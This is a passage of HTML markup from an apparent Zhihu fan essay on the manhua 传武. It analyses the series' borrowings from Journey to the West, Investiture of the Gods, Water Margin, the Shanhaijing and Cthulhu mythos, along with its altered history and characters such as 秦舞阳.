data-private-watermark-src=\"v2-5cb568a2186a5ebb92985600ffff268e\"></p>\n<p>第二次就是走的我个人的拉片流程，建立了Excel表格，对漫画中出现的所有的各大门派，各大势力，绝学，法器，红尘仙，山海种，天灾；都做了简单的归类整理，并标注每件事发生的相关剧情信息；这一次我得出的结论是：传武中的故事和架构是要比我想象的更加严谨合理的；剧情其实也并不是我一开始认为的纯线性平铺直叙；而是不同的线在一开始就交织并行了，虽说不上草蛇灰线，但确实处处有伏笔；所有中期出现的关键剧情其实回过头去看在早期也都有隐晦暗示，只不过之前的剧情发展太慢，导致这些优点并不够明显；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3974d99f264c5ae79766b95ad6a7bf66_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"294\" data-watermark=\"watermark\" data-original-src=\"v2-3974d99f264c5ae79766b95ad6a7bf66\" data-watermark-src=\"v2-f5ea0270470339ce7bd2757a535f66ff\" data-private-watermark-src=\"\"></p>\n<p>第三次是在QQ群看了星云老师七百多页的剧透之后，去对照之前自己做的那些整理，发现绝大多数是还是能够对上的，而一些之前百思不得其解的事情也得到了解答；就此我认为我对两部传武有了一个较为粗浅的认识；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cfcfb37aebebdf2b3702926f17d53ce9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"988\" data-rawheight=\"394\" data-watermark=\"watermark\" data-original-src=\"v2-cfcfb37aebebdf2b3702926f17d53ce9\" data-watermark-src=\"v2-a0b00510ea514cc543d182180ebd4651\" data-private-watermark-src=\"\"></p>\n<h2>《传武》中的神话设定</h2>\n<p>传武中出现最多的，或者说给普通读者最多共鸣的，往往就是传武中出现的那些神话元素，这些元素包括但不限于小说《西游记》；《封神演义》以及《搜神记》《聊斋志异》等志怪小说；这些神话设定一方面丰富了《传武》中此方世界信仰的丰富程度，也在很大一方面降低了部分读者的阅读门槛；使得普通读者在遇到一些细节彩蛋时，也能感受到亲切；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-73d78e8e239c0ad9b844a308b50f09f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-73d78e8e239c0ad9b844a308b50f09f3\" data-watermark-src=\"v2-7801d622463f55458f49a8c9a0aa192c\" data-private-watermark-src=\"\"></p>\n<p><b>1.《西游记》观音小分队的细节</b></p>\n<p>传武中出现的神话设定首屈一指的就是小说《西游记》；由于《传武》中与山阴合作的降世神明都是上界的观音（慈航）选拔的，所以不可避免的这些出现的角色或多或少都和观音或者西游记有一定的联系；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e0bc4892678fce3601b5bcb502a8a298_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"863\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-e0bc4892678fce3601b5bcb502a8a298\" data-watermark-src=\"v2-2b5b4012b2e213634e345b0b1b34055a\" data-private-watermark-src=\"\"></p>\n<p>包括但不仅限于在泰安降临的惠安尊者木吒，潍坊的广目天王魔礼寿（原型出自封神）；滨州的灵感大王；淄州的布袋罗汉惧留孙（原型出自封神）；聊城的伏虎罗汉；东阿的慈航道人观世音；天牢中的百目道人；以及严华绝学枯木逢春的祖师地仙镇元子；上清道的祖师清源妙道真君；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cb431606c2bcc3e0126ff67b7dde4809_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"368\" data-watermark=\"watermark\" data-original-src=\"v2-cb431606c2bcc3e0126ff67b7dde4809\" data-watermark-src=\"v2-9a879e851d1466ff2894b137c6389cc0\" data-private-watermark-src=\"\"></p>\n<p>木吒的绝学是纸人法体以及化形出的三十六路天罡刀；这天罡刀就是在《西游记》原著中为帮助唐僧师徒收服红孩儿；木吒向父亲李天王借用的三十六把天罡刀；灵感大王在滨州与六合帮交手前和《西游记》中一样都布置了利于自己的环境；镇元子在《西游记》中也是依靠观音的帮助才使得人参果树起死回生；反而观音的延伸绝学千鬼横行按照星云老师的说法是发现自己的肉有驯服鬼怪的作用，原型更像是传说中的度母观音；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d1996bc79177e5a02262193bd413c567_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-d1996bc79177e5a02262193bd413c567\" data-watermark-src=\"v2-36f77cbc1c98f585f7695104261c2620\" data-private-watermark-src=\"\"></p>\n<p>可以说观音小分队承担了拉近传武世界与现实世界距离的作用；就好比有的人你很多年前就认识，但《传武》给你机会看了他不为人知的另一面；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2e869a3d33b70e55af278a299acb07e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"552\" data-watermark=\"watermark\" data-original-src=\"v2-2e869a3d33b70e55af278a299acb07e2\" data-watermark-src=\"v2-d734ad5eeb88d92733994767525e5b6a\" data-private-watermark-src=\"\"></p>\n<p><b>2.《封神演义》红尘仙的世俗依靠</b></p>\n<p>和《西游记》中的角色紧紧围绕降世观音不同，《封神演义》中出现的神则更多的对应上方的各位仙神；比如惧留孙就曾提到过元始天尊以及玉虚宫；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-19e551802975d77c33b3efccf0f7a089_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"329\" data-watermark=\"watermark\" data-original-src=\"v2-19e551802975d77c33b3efccf0f7a089\" data-watermark-src=\"v2-02c92911d40dbbf843b4bf67b088257e\" data-private-watermark-src=\"\"></p>\n<p>《封神演义》可以说承担了《传武》中大部分的神明体系；这一体系不仅体现在降世神明的口口相传中；哪怕地上的五行门，上清派，都多多少少的变成了这一体系下的衍生物；《传武》中有很多体制；上界的神魔体制；此方世界的六道体制；大汉的世家体制；大唐的山神土地制；大晋的城隍天牢体制；没有规矩不成方圆，神魔小说中必须有一个规矩去划定尺度以至于剧情不陷于无敌对无敌的崩坏泥沼；但是如果规矩太过复杂或者严苛又会形成知识壁垒，把对漫画不那么了解的普通人拦在墙外；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-77ecfa2952447f058dfe11e64605f2b5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"890\" data-rawheight=\"399\" data-watermark=\"watermark\" data-original-src=\"v2-77ecfa2952447f058dfe11e64605f2b5\" data-watermark-src=\"v2-7c6edd747cdf5066ed9bf9f6db93ced0\" data-private-watermark-src=\"\"></p>\n<p>《传武》比较聪明的调动了大众的公共认识，把我们童年已经构建的那套神魔世界体系在一定的合理化加工后变成一套即能简单上手又经得起推敲琢磨的世界观；可以说，没有《传武》中国孩子心中的这个世界依然存在，而《传武》 的出现，很好的把童年的回忆和我们期待的复杂诡计叙事结合了起来；就像《封神榜》中的漫天星斗，封神之前都要在凡尘中摸爬滚打；所以当看见天上的某颗星才会觉得既崇高又亲切；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b07c386b4555e5e2115d5b6688d94b7e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"990\" data-rawheight=\"556\" data-watermark=\"watermark\" data-original-src=\"v2-b07c386b4555e5e2115d5b6688d94b7e\" data-watermark-src=\"v2-0cc665ce24de5c62eb545e9076299153\" data-private-watermark-src=\"\"></p>\n<p><b>3.《水浒传》故事背后的故事</b></p>\n<p>只从个人角度来说，我觉得在《传武》之外，星云老师肯定曾今也构建过一个以《水浒传》为框架的小说或者漫画剧本；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-38418a796ee78ed2e855d78b7df7449e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"323\" data-watermark=\"watermark\" data-original-src=\"v2-38418a796ee78ed2e855d78b7df7449e\" data-watermark-src=\"v2-4e76b251c702a05f768bac3b2bdf827b\" data-private-watermark-src=\"\"></p>\n<p>一方面《传武》中出现那些天罡地煞的形象与名字，如原本就出自水浒的没遮拦穆弘，与水浒形象相似的一丈青姚金秀，以及蓝虎；还有天牢中的昆仑奴石方尊（运气爆表）双面人杨智,小阎王罗正等；其实都有极大的可能是出自星云大佬另外构建的一个世界中的出身角色；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4d722a4438af9cfd4d9207c23f90ea9b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"343\" data-watermark=\"watermark\" data-original-src=\"v2-4d722a4438af9cfd4d9207c23f90ea9b\" data-watermark-src=\"v2-3e491b22f8542f7cc46df943bd603783\" data-private-watermark-src=\"\"></p>\n<p>另外还有传武中无处不在的两个设定：有限的一百零八个天灾成道机会，以及朝廷到处收集的星斗仙术资料与天罡地煞术的存在；这里也很想安利一下同样非常优秀的田野一洋老师的《异闻水浒传》和胡伟老师的《长安督武司》；都是在限定了绝学和世界观上限的体系中厮杀的经典漫画；虽然《传武》中因为上方世界的存在，一定程度上削弱了这些下级武人之间拼杀的惨烈；但也能感受到很多可能转瞬即逝的龙套角色，在早期应该都是有属于自己的剧情脉络的；（好比番外篇的中出现的六合帮）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fc810d5d8e62a9ba9b28b7b7f50c6cc8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"980\" data-rawheight=\"503\" data-watermark=\"watermark\" data-original-src=\"v2-fc810d5d8e62a9ba9b28b7b7f50c6cc8\" data-watermark-src=\"v2-390d23b86c5620d341b12ec302623fe9\" data-private-watermark-src=\"\"></p>\n<p><b>4.漫画背后的微缩历史</b></p>\n<p>目前《传武》中明确设计的历史有楚汉战争（项羽和樊哙）大汉，颠覆大汉的张角；李世民打造的大唐（山神土地制度）上一世的人屠黄巢等；可以看出来如果二百年前的历史不因为上界的战争发生偏移那《传武》中此方世界的王朝与战争应该是和我们经历的历史高度趋同的；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1cc48689bae6652384149f2f4f14ed29_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"858\" data-rawheight=\"504\" data-watermark=\"watermark\" data-original-src=\"v2-1cc48689bae6652384149f2f4f14ed29\" data-watermark-src=\"v2-70dca6297ac252d3b0cd060e7d39c0d9\" data-private-watermark-src=\"\"></p>\n<p>同样的人物以及背景，虽然被赋予了各种绝学和传承，但是也和那些小说中的彩蛋一样，大大削减了读者的阅读门槛；在这一层上我们可以从一个弈棋者的视角而不是棋子的视角来盛世这些王朝之间的战争；比如祸秧道对王朝道的侵蚀，通过祸根来打造乱世；再比如生死道对其余五道的统治与经营布置；就好比上清道祖师李董说的，只有站在棋盘之上称为拿着棋子的人，才能看见《传武》世界的运行轨迹；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-11d4c67765658396cf7ca8535575ec11_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"813\" data-rawheight=\"494\" data-watermark=\"watermark\" data-original-src=\"v2-11d4c67765658396cf7ca8535575ec11\" data-watermark-src=\"v2-87204573ec997e204857a7755bbbdfad\" data-private-watermark-src=\"\"></p>\n<p>这种在完全架空的漫画中引用大量真实历史的文学产品虽然不在少数，比如《高堡奇人》，《祖国》；但像《传武》这样，如此大刀阔斧的在关键历史转折点改变历史轨迹，打造出一个在文化依然封建但是科技水平军事势力都远远高于当时社会的科技与神魔共存的世界的还是比较少见的（可能网络小说中会出现）这种生产认识与技术力的不平衡其本身就是极具戏剧性的；在传武早期还能看到完全出于农耕社会的东阿，聊城；但是到了朱雀的星轨开始这个世界就已经超出了社会自然发展的控制了；就像严华说的上界给这个世界带来了绝学，带来了星轨，带来了玉米；就像是二战后直接被划入全球化的原始社会，虽然大晋依然严格管控着这些变量，但是其中蕴含的变革的力量必将带动剧情的快速发酵；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f46703912b60b19508341b9cbe6b9e1d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"387\" data-watermark=\"watermark\" data-original-src=\"v2-f46703912b60b19508341b9cbe6b9e1d\" data-watermark-src=\"v2-a2b628a55fefb7a8c0edad5850a6588e\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的山海经设定</b></h2>\n<p>传武除了人类社会，其实还有一个比较隐晦的妖怪社会，比如一开始就说起的雁门关外的猰貐；陈兴获得的婴如；若木之种的各种形态；以及那些在千鬼横行中出现的各种天灾鬼患；其实在第一次连载阅读时期就能体验到这里的伏笔，然而在我阅读了星云老师的剧透后，还是觉得是我想的太简单了；山海种和人类之间既有合作共赢的历史（大唐的山神，大晋的山海司）也暗示了很多的种族问题以及人与自然的思辨；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-05791f1d24341abd4d64bb48c6b7799f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"885\" data-rawheight=\"381\" data-watermark=\"watermark\" data-original-src=\"v2-05791f1d24341abd4d64bb48c6b7799f\" data-watermark-src=\"v2-dd67e889e9929f436ad981eae3cc060c\" data-private-watermark-src=\"\"></p>\n<p><b>1.仁兽驺虞的变态之路</b></p>\n<p>就拿传说中的万物之红尘仙驺虞来说；《传武》中的驺虞最早出自第二卷第125条.经验之谈；是尸鬼一脉的祖先；然而在现实生活中：驺虞是中国古代传说中的一种野兽；一种虎躯猊首，白毛黑纹，尾巴很长的动物，在《神奇动物在哪里》中那个长尾巴的大猫就是驺虞。据说驺虞生性仁慈，连青草也不忍心践踏，不是自然死亡的生物不吃。被文人认为是仁慈之兽；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-64b15292759c46f004ca262bb027694f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"393\" data-watermark=\"watermark\" data-original-src=\"v2-64b15292759c46f004ca262bb027694f\" data-watermark-src=\"v2-5fe60163e54f520fced16752555ac8a3\" data-private-watermark-src=\"\"></p>\n<p>然而当驺虞第一次出现在《传武》世界观中时，他的设定则是尸鬼术的源头，世界僵尸的祖师，是怨恨人类的存在；其实我个人感觉当年此方世界的观音骑着的那只人面神兽应该就是驺虞，也只有山海种中的红尘仙才镇得住九尾狐这样的大妖；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-65ecb928bad538207efce2eefe353aa6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1037\" data-rawheight=\"401\" data-watermark=\"watermark\" data-original-src=\"v2-65ecb928bad538207efce2eefe353aa6\" data-watermark-src=\"v2-51449bfad0c18cd06327a6d3b3b335a3\" data-private-watermark-src=\"\"></p>\n<p>其实从后面水镜空间的剧情可以看出，此方世界的观音一直与山海种保持这高度的联系；但是也必然的她应该要为万物道红尘仙驺虞之后的变化附有一定的责任；根据星云老师在暗示中的线索此方世界的观音应该也是最早的绝技红尘仙（早于李董）；我们知道就大晋统治时期，王朝和鬼神的掌道者是站在大晋背后，万物和祸殃的掌道者与大晋对立，生死和奇技的掌道者则选择中立。 那么有没有可能在大汉建立之前除生死道外的五道也经历过某种对立与洗牌呢？（以上都是个人瞎猜，一切以剧情为准）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-58fba9888e986aa8eb2948df93682524_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"410\" data-watermark=\"watermark\" data-original-src=\"v2-58fba9888e986aa8eb2948df93682524\" data-watermark-src=\"v2-2a670cf2f0cfe1aecb9fd4301d2c57ad\" data-private-watermark-src=\"\"></p>\n<p><b>2.雁门关外的火凤燎原</b></p>\n<p>《传武》中雁门关外的那只猰貐一直是被不断提起确实又从未正面描述过的存在；我们读者除了知道猰貐很强（朱雀一种在送）且对人类抱有很大的恶意外，也并不知道更多的剧情了；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1cbdf63ccf70c408798cfc97005fa299_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"635\" data-watermark=\"watermark\" data-original-src=\"v2-1cbdf63ccf70c408798cfc97005fa299\" data-watermark-src=\"v2-d85adc45536d35d0853a43424bb4c707\" data-private-watermark-src=\"\"></p>\n<p>从星云老师剧透中提到的暗示来看四象各有分工，青龙负责把守天牢；白虎负责处理人形天灾；朱雀负责对敌雁门关的敌人；玄武负责游走于天下捉拿大晋潜在的威胁；其中朱雀掌握的南明离火属于《传武》八大火之一，是作者公认的规格外的存在（相当于隐形轰炸机）我简单在网上看来一下南明离火这个词；不出所料都是比较中二的设定聚合体；不结合现实中的中国历史来看，应该和《斗破苍穹》中的异火一样是特殊的火焰吧；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-90fdd0cfd1ed1c6951d85a5dd89bbb5f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"986\" data-rawheight=\"415\" data-watermark=\"watermark\" data-original-src=\"v2-90fdd0cfd1ed1c6951d85a5dd89bbb5f\" data-watermark-src=\"v2-0b11b47fa2aa5e70b1488606b208b7a9\" data-private-watermark-src=\"\"></p>\n<p>大晋要把超过四分之一的战力安排在雁门关外说明雁门关外的战争不仅仅是我们认识中的北方胡人侵扰的简单缩影，胡人方面其实也有万俟这样更明确的指代了；结合大晋用城隍制度取代了大唐的山神土地制度来看雁门关的战争可能另有隐情；个人猜测和当年山阴抽干鱼山龙脉有关；不知道现在开封天牢外的龙脉是否和鱼山龙脉有关；如果这龙脉是两个王朝之前非此即彼的关系的话，那最后作者的安排其实也能看出更多传承与发展间的取舍（不小心扯远了）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b38028b497124092a674e1b60d2e0211_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"307\" data-watermark=\"watermark\" data-original-src=\"v2-b38028b497124092a674e1b60d2e0211\" data-watermark-src=\"v2-11029d59eca9b550762d4efc59677b75\" data-private-watermark-src=\"\"></p>\n<p><b>3.青龙背负的四大灾星</b></p>\n<p>宁仲背上是所谓的人类面临的四大天灾；目前已经出现的是旱；洪；疫；虽然星云老师并没有设计好，但个人认为最后一个如果要找同等级的还是兵灾更合适一点（历史上兵灾有时也算天灾）；其余如蝗灾的代表飞蝗道人，泥石流的代表石方尊已经在天牢中；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a08166982c9e2ef3e88e8f6bf109f609_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"986\" data-rawheight=\"664\" data-watermark=\"watermark\" data-original-src=\"v2-a08166982c9e2ef3e88e8f6bf109f609\" data-watermark-src=\"v2-b89f7b8af62cb666d01e1be4c49a03a6\" data-private-watermark-src=\"\"></p>\n<p>关于人类对自然灾祸的恐惧，《诗·大雅·云汉》：“旱魃为虐，如惔如焚。”孟子提到：“洚水警余”。至于疫灾的危害，我们今天更是刻骨铭心；在星云老师还提到了如果《传武》的舞台在日本那天灾也免不了类似白胡子的震震果实和核辐射这样的类型；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-24b60a5d1cc23ac08e2e77d6a6bff3b9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"862\" data-rawheight=\"498\" data-watermark=\"watermark\" data-original-src=\"v2-24b60a5d1cc23ac08e2e77d6a6bff3b9\" data-watermark-src=\"v2-cd9819948a666ec58a6b8a64c718dcb9\" data-private-watermark-src=\"\"></p>\n<p>在《传武》世界观中天灾被限定为了一百零八种（部分龙套星云老师说不屑取名字），目前在天牢中与宁仲交手的有名有姓的天灾共有二十位：百目道人-百目；异食经-虢也；纸艺人-朱平；奈何手-道去 奈何手； 移山略缺-沈冲；三世神经-三首；活僵-亓官氏；五想欲-释寂悟 ；六度三绝-吾道济 ；蝗中躯-飞蝗道人；小阎王 -罗正；六臂尊者-迦叶；昆仑奴-石方尊；兽王-閺虎；缝尸匠-天残；红妆女-厉鬼；散发鬼；画郎书仙-不笑书生；纸人-朱褶；杨智-双面人；加上之前就提到的白骨洞的白骨精和李存孝；如果再加上山阴的百足等目前出现的天灾，目前应该有约二十五位天灾了；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-510b964bc9ee0968a38c56ca40964a18_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"927\" data-rawheight=\"627\" data-watermark=\"watermark\" data-original-src=\"v2-510b964bc9ee0968a38c56ca40964a18\" data-watermark-src=\"v2-a88b0448dbd623260fffa0d8073cc03d\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的克苏鲁设定</b></h2>\n<p>《传武》中的一大两点就是把传统神话中的旧神和克苏鲁神话中的外神巧妙结合；将原本的一个故事，通过世界观的调整，变成不同风格的多个版本；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cdfc5db79c792872c37c29a54d58f365_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"233\" data-watermark=\"watermark\" data-original-src=\"v2-cdfc5db79c792872c37c29a54d58f365\" data-watermark-src=\"v2-b66cb765b018264f5ed413653963319e\" data-private-watermark-src=\"\"></p>\n<p><b>1.黄衣之王与他的黄沙眷属</b></p>\n<p>黄衣之王哈斯塔，是克苏鲁神话中不可描述的旧日支配者，是克苏鲁的兄弟，也是克苏鲁的死敌；其实黄衣之王的设定是要早于克苏鲁神话的；罗伯特·W·钱伯斯在1895年出版的《黄衣之王》中就已经创造了这个角色，不过当创作克苏鲁神话的作者洛夫克拉夫特读到了黄衣之王这个设定时，他觉得这个角色简直就是为了克苏鲁世界创造的；于是黄衣之王也成立旧日支配者之一；在克苏鲁神话中，洛夫克拉夫特把他安排成了克苏鲁的死敌；不过在《传武》中他们属于同一阵营；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4f1bbcd53f24d42864725de85ac1f82b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"987\" data-rawheight=\"476\" data-watermark=\"watermark\" data-original-src=\"v2-4f1bbcd53f24d42864725de85ac1f82b\" data-watermark-src=\"v2-9c83fd468473c8c33d3db814d23e0cde\" data-private-watermark-src=\"\"></p>\n<p>理论上黄衣之王哈斯塔的本体被困在金牛座的毕宿五附近，所以他也被称为“深空星海之主”哈斯塔在成为黄衣之王有一个印记，是哈斯塔信徒信仰的来源之一；这个印记可能就是《传武》中道标的原型之一；我个人认为这个道标就是信仰的实体化产物；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-98973b9c29e75a243e7d5e63a84d2861_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"326\" data-watermark=\"watermark\" data-original-src=\"v2-98973b9c29e75a243e7d5e63a84d2861\" data-watermark-src=\"v2-33a9a57e96657500ebfc61204e0e1a9f\" data-private-watermark-src=\"\"></p>\n<p>在《传武》此方世界的黄泉渡口一战中，酆都就因为低估了哈斯塔和他的风之眷族导致难以消灭哈斯塔的有生力量导致此方世界的崩坏，星云老师提到过：外神选择攻陷本土神系的小千世界时，为了对付那些有着不死特质的本土神明；  外神入侵小千世界前需要先拆掉这个世界的底层框架，使世界规则先变为无序；很明显此方世界地狱的崩坏就是这个计划中的第一步；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-08e8df5d15c0f65f7b07d82dc13a4c2c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"801\" data-rawheight=\"454\" data-watermark=\"watermark\" data-original-src=\"v2-08e8df5d15c0f65f7b07d82dc13a4c2c\" data-watermark-src=\"v2-1784c0f66f9104be42d625a554fd9f20\" data-private-watermark-src=\"\"></p>\n<p><b>2.克苏鲁神话外的克苏鲁</b></p>\n<p>在淄州的惧留孙为了实验信仰之力，召唤了外域邪神克苏鲁；克苏鲁是美国小说家霍华德·菲利普·洛夫克拉夫特所创造的克苏鲁神话中的存在，和哈斯塔一样是旧日支配者之一。虽然不是克苏鲁神话中地位最高的，却是最知名的，同时也是克苏鲁神话的形象代表。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-238daf55e8928f4be973e9ddba119783_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"859\" data-rawheight=\"411\" data-watermark=\"watermark\" data-original-src=\"v2-238daf55e8928f4be973e9ddba119783\" data-watermark-src=\"v2-3d965a038ed80b080baf312b0300a7b6\" data-private-watermark-src=\"\"></p>\n<p>漫画中除了克苏鲁也同样出现了克苏鲁的眷族深海种；虽然智力不高但是和哈斯塔的风之眷族一样，在《传武》世界中起到提供信仰之力的作用，正是他们源源不断的信仰才使得如克苏鲁这样的神拥有源源不断的法力与生命力；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-575618ae9270b9ec55431bc06b51f277_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"860\" data-rawheight=\"369\" data-watermark=\"watermark\" data-original-src=\"v2-575618ae9270b9ec55431bc06b51f277\" data-watermark-src=\"v2-fa703d726c592d5a06583e2055b74039\" data-private-watermark-src=\"\"></p>\n<p>在淄州一战中惧留孙通过能力暂时击败了克苏鲁的投影；克苏鲁神话中个体生命的意义更多是只是神明传承的工具，在这场神魔大战中，神明方自己都没有意识到，自己可能也在渐渐转变为这种样子，如果真是这样，那将来即使旧神赢得了战争也可能可能转化为披着传统神明外衣的克苏鲁神；所以这也是为什么凡人不应该把命运交给那些高高在上的神明的原因；（个人观点）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7675a5361ac2400122bfbe423cb69f9a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"364\" data-watermark=\"watermark\" data-original-src=\"v2-7675a5361ac2400122bfbe423cb69f9a\" data-watermark-src=\"v2-932befdadf674c3520ae37de4eb8edf6\" data-private-watermark-src=\"\"></p>\n<h2><b>传武中的戏剧化设定</b></h2>\n<p><b>1.二百年一轮的庄周梦蝶</b></p>\n<p>两百年前对邪神的感知，开启了秦无阳的传奇一生；其实中国历史上也有一位秦舞阳，他随荆轲入秦刺杀秦始皇；但是历史的记载却很少；这两位秦舞阳都一样是自信且自负的理想主义者；首先从短暂的宏观来看秦舞阳没有错，他处处顾全大局，像极了战乱时期那些追求驱虎吞狼的革命者与战略家；但是神明所化的虎，你把握不住；天道更是一个混乱的不定值；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2f034f967a44561206a95c8274df89d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"482\" data-watermark=\"watermark\" data-original-src=\"v2-2f034f967a44561206a95c8274df89d2\" data-watermark-src=\"v2-655da31f7b70ab91319b1ecb0f44ce3a\" data-private-watermark-src=\"\"></p>\n<p>无论如何漫画中秦舞阳在淄州的黄粱一梦都算是智斗的巅峰；通过梦境共享来做到使敌人自相矛盾；这种想象力和叙事性都是指的肯定的；星云老师说秦舞阳所用的梦境仙法不属于六道中的任何一门，因为梦是这个世界原有的东西；这让我想起黄衣之王哈斯卡在选择黄印宿主时往往会选择通过梦境来进入那人的思维深处，而秦舞阳自认为救苍生的举动也正想是他戏耍严华的黄粱一梦；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-71789f107c5ac9848edb6889d529936d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"987\" data-rawheight=\"550\" data-watermark=\"watermark\" data-original-src=\"v2-71789f107c5ac9848edb6889d529936d\" data-watermark-src=\"v2-240e7f3e5f8b0acfc32c9c29c28755bb\" data-private-watermark-src=\"\"></p>\n<p>这二百余年的舍命追求，到底是求来了神明的施舍；战争的胜利，还是到头来不过是黄粱一梦呢？期待秦舞阳这个山阴灵魂人物的结局，也期待未来有关他和二百年前的故事；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ba450150eb8856f8a4cd4523cc025223_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"983\" data-rawheight=\"482\" data-watermark=\"watermark\" data-original-src=\"v2-ba450150eb8856f8a4cd4523cc025223\" data-watermark-src=\"v2-c58308fae03d2ad9c6242909a768a5ef\" data-private-watermark-src=\"\"></p>\n<p><b>2.樊家的王之宝库</b></p>\n<p>目前在《传武》此方世界的体系中被星云老师认真为最强的就是生死道的酆都和他的幽都之种；目前已经出现的如恶来和项羽都展现出了碾压天灾级别的战力和操作（李存孝预计也有可能加入幽都大礼包）；而如此强大的生死道其实也不一定全身酆都的个人玩具；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9bea722a6762a46bc0b5285db4e42103_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"770\" data-rawheight=\"430\" data-watermark=\"watermark\" data-original-src=\"v2-9bea722a6762a46bc0b5285db4e42103\" data-watermark-src=\"v2-86a0030da5067124778bd695a5985509\" data-private-watermark-src=\"\"></p>\n<p>在汉代就有人想到了通过血脉存续来模仿幽都之种的方式，这就是樊之血；还有樊家掌握的绝学百兵演武；星云老师曾说过百兵演武和木吒的三十六天罡刀原理是一样的，区别是三十六天罡刀数量是固定的，而百兵演武中是有当代所有武器的投影；对一个武道强者来说，随时随地有取之不尽的武器是一种很可怕的绝学；武器本身因为长短软硬各有千秋，但是百兵演武可以使各种武器无缝配合，将武器之间CD的降到最小；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-322c97df2a3c79fc363b1b2724b21bc4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"295\" data-watermark=\"watermark\" 